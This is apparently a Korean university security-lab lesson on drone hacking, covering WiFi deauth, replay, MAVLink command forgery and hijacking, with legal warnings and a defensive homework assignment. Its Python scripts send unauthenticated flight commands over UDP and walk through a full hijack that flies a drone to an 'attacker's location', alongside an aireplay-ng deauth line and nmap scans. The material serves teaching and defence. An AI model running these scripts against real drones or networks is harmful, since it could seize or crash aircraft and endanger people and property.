# Week 03: 드론 해킹 — Deauth, 명령어 인젝션, 하이재킹

## 학습 목표
- WiFi deauthentication 공격의 원리와 드론에 대한 영향을 이해한다
- 드론 명령어 인젝션 공격을 실습할 수 있다
- 드론 하이재킹(세션 탈취) 기법을 분석할 수 있다
- 드론 통신 스니핑과 리플레이 공격을 수행할 수 있다
- 공격의 윤리적/법적 의미를 인식한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| attacker | 10.20.30.201 | 공격/분석 머신 | `ssh ccc@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM | `ssh ccc@10.20.30.100` |
| manager | 10.20.30.200 | AI/관리 (Ollama LLM) | `ssh ccc@10.20.30.200` |

**LLM API:** `${LLM_URL:-http://localhost:8003}`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:30 | 이론: 드론 공격 벡터 종합 (Part 1) | 강의 |
| 0:30-1:00 | 이론: WiFi Deauth와 세션 하이재킹 (Part 2) | 강의 |
| 1:00-1:10 | 휴식 | - |
| 1:10-1:50 | 실습: 가상 드론 통신 스니핑 (Part 3) | 실습 |
| 1:50-2:30 | 실습: 명령어 인젝션 공격 (Part 4) | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | 실습: 드론 하이재킹 시뮬레이션 (Part 5) | 실습 |
| 3:10-3:30 | 과제 안내 + 정리 | 정리 |

---

## Part 1: 드론 공격 벡터 종합 (0:00-0:30)

### 1.1 드론 공격 분류

```
드론 공격 벡터
│
├── 통신 계층 공격
│   ├── WiFi Deauth (연결 끊기)
│   ├── RF 재밍 (통신 차단)
│   ├── 패킷 스니핑 (도청)
│   └── 세션 하이재킹 (탈취)
│
├── 명령/제어 공격
│   ├── 명령어 인젝션
│   ├── MAVLink 위조
│   ├── 리플레이 공격
│   └── 펌웨어 변조
│
├── 센서 공격
│   ├── GPS 스푸핑
│   ├── 카메라 블라인딩
│   └── IMU 음향 공격
│
└── 물리적 공격
    ├── 드론 포획(안티드론)
    ├── RF 방해 (재머)
    └── 레이저 무력화
```

### 1.2 SkyJack 공격 시나리오

2013년 Samy Kamkar의 SkyJack 프로젝트는 WiFi 드론 하이재킹의 대표 사례이다.

```
공격 흐름:
1. 공격 드론이 대상 드론의 WiFi AP 탐지
2. deauth 패킷으로 정상 조종자 연결 해제
3. 공격자가 드론 WiFi AP에 연결
4. MAVLink 명령으로 드론 제어 탈취
5. 드론을 공격자의 의도대로 조종

정상 조종자 ─── WiFi ───▶ 드론 AP
                          ▲
공격자 ── deauth ──┘      │
공격자 ── connect ────────┘
공격자 ── MAVLink CMD ────▶ 드론 제어
```

### 1.3 법적/윤리적 고려사항

| 행위 | 법적 상태 | 비고 |
|------|-----------|------|
| 허가된 환경에서 테스트 | 합법 | 본 실습 해당 |
| WiFi deauth 무단 실행 | 불법 | 전파법 위반 |
| 타인 드론 하이재킹 | 불법 | 항공안전법, 정보통신법 위반 |
| 드론 격추 | 불법 | 재물손괴, 항공법 위반 |

> **경고:** 모든 실습은 가상 환경에서만 수행한다. 실제 드론이나 네트워크에 대한 무단 공격은 법적 처벌 대상이다.

---

## Part 2: WiFi Deauth와 세션 하이재킹 이론 (0:30-1:00)

### 2.1 WiFi Deauthentication 공격 원리

```
IEEE 802.11 Management Frame
┌──────────────┬──────────────┬──────────────┐
│ Frame Control│ Duration     │ Destination  │
│ Type: 0x00C0 │              │ MAC          │
│ (Deauth)     │              │              │
├──────────────┼──────────────┼──────────────┤
│ Source MAC   │ BSSID        │ Seq Control  │
│              │              │              │
├──────────────┴──────────────┴──────────────┤
│ Reason Code (e.g., 0x0007 = Class 3       │
│ frame received from non-associated station)│
└────────────────────────────────────────────┘
```

**핵심 취약점:** 802.11 관리 프레임은 인증되지 않아 위조 가능 (WPA3/802.11w PMF로 완화)

### 2.2 드론 하이재킹 프로세스

```
단계 1: 정찰
  └─ 드론 WiFi AP 탐지 (SSID, BSSID, 채널)

단계 2: 연결 해제
  └─ Deauth 프레임 전송 → 조종자 연결 끊김

단계 3: 연결 탈취
  └─ 공격자가 드론 AP에 연결 (드론이 AP 역할)

단계 4: 제어 탈취
  └─ MAVLink/독점 프로토콜로 명령 전송

단계 5: 임무 수행
  └─ 드론을 공격자 의도대로 조종
```

### 2.3 리플레이 공격

```
정상 통신 캡처:
조종자 ──[TAKEOFF cmd]──▶ 드론

공격자가 패킷 캡처 후 재전송:
공격자 ──[TAKEOFF cmd (복사)]──▶ 드론

시퀀스 번호 검증이 없으면 드론은 명령을 수행
```

---

## Part 3: 가상 드론 통신 스니핑 (1:10-1:50)

### 3.1 UDP 트래픽 스니핑 시뮬레이션

```bash
# 가상 드론 통신을 스니핑하는 스크립트
python3 << 'PYEOF'
import socket
import json
import time

print("=== Virtual Drone Communication Sniffer ===")
print("[*] Monitoring UDP traffic on port 9999...")
print()

# 시뮬레이션: 캡처된 드론 명령 패킷들
captured_packets = [
    {"src": "10.20.30.201", "dst": "10.20.30.200", "data": {"action": "AUTH", "key": "DRONE_SECRET_2026"}},
    {"src": "10.20.30.201", "dst": "10.20.30.200", "data": {"action": "ARM"}},
    {"src": "10.20.30.201", "dst": "10.20.30.200", "data": {"action": "TAKEOFF", "altitude": 50}},
    {"src": "10.20.30.201", "dst": "10.20.30.200", "data": {"action": "GOTO", "lat": 37.57, "lon": 126.98}},
    {"src": "10.20.30.200", "dst": "10.20.30.201", "data": {"status": "NAVIGATING", "battery": 85}},
    {"src": "10.20.30.201", "dst": "10.20.30.200", "data": {"action": "LAND"}},
]

for i, pkt in enumerate(captured_packets):
    direction = ">>>" if pkt["src"] == "10.20.30.201" else "<<<"
    print(f"[PKT {i+1}] {pkt['src']} {direction} {pkt['dst']}")
    print(f"  Data: {json.dumps(pkt['data'])}")

    # 보안 분석
    if 'key' in str(pkt['data']):
        print(f"  [!] WARNING: Authentication key found in plaintext!")
    if pkt['data'].get('action') in ('ARM', 'TAKEOFF', 'GOTO', 'LAND'):
        print(f"  [!] CRITICAL: Flight control command captured!")
    print()

print("=== Analysis Complete ===")
print("[!] Findings:")
print("  - Authentication key transmitted in PLAINTEXT")
print("  - No encryption on command channel")
print("  - Commands can be replayed")
print("  - No sequence number validation")
PYEOF
```

### 3.2 네트워크 스캔으로 드론 식별

```bash
# 드론이 AP로 동작하는 경우 네트워크 스캔
nmap -sV -p 9999,14550,5760,554 10.20.30.200

# 모든 UDP 서비스 탐지
nmap -sU -p 9999,14550,14555 10.20.30.200 2>/dev/null || echo "UDP scan done"
```

---

## Part 4: 명령어 인젝션 공격 (1:50-2:30)

### 4.1 가상 드론 명령 인젝션

```bash
# 인증 없이 직접 명령 전송 시도
python3 << 'PYEOF'
import socket, json

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(3)
target = ('10.20.30.200', 9999)

print("=== Drone Command Injection Test ===")
print()

# 테스트 1: 인증 없이 ARM 시도
injections = [
    {"action": "ARM", "note": "인증 없이 ARM 시도"},
    {"action": "TAKEOFF", "altitude": 100, "note": "인증 없이 이륙 시도"},
    {"action": "GOTO", "lat": 0, "lon": 0, "note": "좌표 0,0으로 유도 시도"},
    {"action": "LAND", "note": "강제 착륙 명령"},
    {"action": "STATUS", "note": "상태 정보 수집"},
    {"action": "EMERGENCY_STOP", "note": "비표준 긴급정지 명령"},
    {"action": "SET_HOME", "lat": 37.0, "lon": 127.0, "note": "홈 위치 변경 시도"},
]

for inj in injections:
    note = inj.pop('note')
    sock.sendto(json.dumps(inj).encode(), target)
    try:
        data, _ = sock.recvfrom(4096)
        resp = json.loads(data.decode())
        status = resp.get('status', 'N/A')
        vuln = "VULNERABLE" if status not in ('AUTH_REQUIRED', 'DENIED', 'UNKNOWN_CMD', 'ERROR') else "PROTECTED"
        print(f"[{vuln}] {note}")
        print(f"  Command: {json.dumps(inj)}")
        print(f"  Response: {resp}")
    except socket.timeout:
        print(f"[TIMEOUT] {note}")
    print()

sock.close()
print("=== Injection Test Complete ===")
PYEOF
```

### 4.2 MAVLink 명령 위조 시뮬레이션

```bash
# MAVLink COMMAND_LONG 패킷 구성 시뮬레이션
python3 << 'PYEOF'
import struct

print("=== MAVLink Command Forgery Simulation ===")
print()

# MAVLink v2 COMMAND_LONG (MSG ID: 76) 구성
# 실제로는 직렬화된 바이너리를 전송하지만 여기서는 구조 분석

commands = {
    "MAV_CMD_NAV_TAKEOFF (22)": {
        "target_system": 1,
        "target_component": 1,
        "command": 22,
        "param1": 0,    # pitch
        "param5": 37.5665,  # latitude
        "param6": 126.978,  # longitude
        "param7": 100,      # altitude
    },
    "MAV_CMD_NAV_RETURN_TO_LAUNCH (20)": {
        "target_system": 1,
        "target_component": 1,
        "command": 20,
    },
    "MAV_CMD_COMPONENT_ARM_DISARM (400)": {
        "target_system": 1,
        "target_component": 1,
        "command": 400,
        "param1": 1,  # 1=arm, 0=disarm
    },
}

for name, cmd in commands.items():
    print(f"[FORGED] {name}")
    for k, v in cmd.items():
        print(f"  {k}: {v}")

    # MAVLink v2 헤더 구성
    header = struct.pack('<BBBBBBB',
        0xFD, 33, 0, 0, 0, 1, 1)
    print(f"  Header (hex): {header.hex()}")
    print(f"  [!] No signature → easily forgeable")
    print()

print("[RESULT] Without MAVLink signing, all commands can be forged")
PYEOF
```

---

## Part 5: 드론 하이재킹 시뮬레이션 (2:40-3:10)

### 5.1 전체 하이재킹 시나리오

```bash
python3 << 'PYEOF'
import socket, json, time

print("=" * 60)
print("  DRONE HIJACKING SIMULATION")
print("  (Educational Purpose Only - Virtual Environment)")
print("=" * 60)
print()

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(3)
target = ('10.20.30.200', 9999)

def send_cmd(cmd):
    sock.sendto(json.dumps(cmd).encode(), target)
    try:
        data, _ = sock.recvfrom(4096)
        return json.loads(data.decode())
    except:
        return {"status": "TIMEOUT"}

# Phase 1: 정찰
print("[Phase 1] RECONNAISSANCE")
print("  Scanning for drone on network...")
resp = send_cmd({"action": "PING"})
print(f"  Drone found: {resp}")
resp = send_cmd({"action": "STATUS"})
print(f"  Current state: {resp}")
print()

# Phase 2: Deauth 시뮬레이션
print("[Phase 2] DEAUTH SIMULATION")
print("  Sending deauth frames to disconnect legitimate controller...")
print("  [SIM] aireplay-ng --deauth 10 -a <DRONE_BSSID> -c <CONTROLLER_MAC>")
print("  [SIM] Legitimate controller disconnected!")
print()

# Phase 3: 연결 및 인증 탈취
print("[Phase 3] CONNECTION HIJACK")
print("  Connecting to drone WiFi AP...")
# 스니핑에서 획득한 키로 인증 시도
resp = send_cmd({"action": "AUTH", "key": "DRONE_SECRET_2026"})
print(f"  Auth attempt with sniffed key: {resp}")
print()

# Phase 4: 드론 제어 탈취
print("[Phase 4] TAKING CONTROL")
resp = send_cmd({"action": "ARM"})
print(f"  ARM: {resp}")
resp = send_cmd({"action": "TAKEOFF", "altitude": 100})
print(f"  TAKEOFF to 100m: {resp}")
print()

# Phase 5: 드론 유도
print("[Phase 5] REDIRECTING DRONE")
waypoints = [
    (37.5700, 126.9800, "Waypoint 1"),
    (37.5750, 126.9850, "Waypoint 2"),
    (37.5800, 126.9900, "Attacker's location"),
]
for lat, lon, name in waypoints:
    resp = send_cmd({"action": "GOTO", "lat": lat, "lon": lon})
    print(f"  GOTO {name} ({lat}, {lon}): {resp}")

print()
resp = send_cmd({"action": "LAND"})
print(f"  LAND at attacker location: {resp}")

print()
print("=" * 60)
print("  SIMULATION COMPLETE")
print("=" * 60)
print()
print("[LESSON] This attack was possible because:")
print("  1. WiFi deauth frames are unauthenticated")
print("  2. Authentication key was transmitted in plaintext")
print("  3. No mutual authentication between drone and GCS")
print("  4. MAVLink commands were not signed or encrypted")

sock.close()
PYEOF
```

### 5.2 LLM 활용 공격 분석

```bash
curl -s ${LLM_URL:-http://localhost:8003}/api/chat \
  -d '{
    "model":"gemma3:4b",
    "messages":[
      {"role":"system","content":"You are a drone security researcher. Provide technical analysis."},
      {"role":"user","content":"Analyze the SkyJack drone hijacking attack. What are the 3 key vulnerabilities it exploits and how can each be mitigated?"}
    ],
    "stream":false,
    "options":{"num_predict":250}
  }' | python3 -c "import sys,json; print(json.load(sys.stdin)['message']['content'])"
```

---

## Part 6: 과제 안내 (3:10-3:30)

### 과제

**과제:** 드론 하이재킹 공격에 대한 방어 메커니즘을 설계하시오.
- MAVLink 서명을 활용한 명령 인증 구현 (Python)
- 비정상 명령 시퀀스 탐지 규칙 작성
- 공격 탐지 시 자동 RTL(Return to Launch) 트리거

---

## 참고 자료

- SkyJack: https://samy.pl/skyjack/
- "Security Analysis of Drone Communication Protocols" - Hooper et al.
- MAVLink v2 Signing: https://mavlink.io/en/guide/message_signing.html
- WiFi Deauth 원리: IEEE 802.11 Management Frames

---

## 실제 사례 (WitFoo Precinct 6)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> Sanitized — RFC5737 TEST-NET / ORG-NNNN / HOST-NNNN 으로 익명화됨.

### Case 1: `T1041 (Data Theft)` 패턴

```
incident_id=d45fc680-cb9b-11ee-9d8c-014a3c92d0a7 mo_name=Data Theft
red=172.25.238.143 blue=100.64.5.119 suspicion=0.25
```

**해석**: 위 데이터는 실제 incident 의 sanitized 기록이다. `T1041 (Data Theft)` MITRE technique 의 행동 패턴이며, 본 강의의 학습 주제와 동일한 운영 맥락에서 발생한다.

### Case 2: `T1041 (Data Theft)` 패턴

```
incident_id=c6f8acf0-df14-11ee-9778-4184b1db151c mo_name=Data Theft
red=100.64.3.190 blue=100.64.3.183 suspicion=0.25
```

**해석**: 위 데이터는 실제 incident 의 sanitized 기록이다. `T1041 (Data Theft)` MITRE technique 의 행동 패턴이며, 본 강의의 학습 주제와 동일한 운영 맥락에서 발생한다.

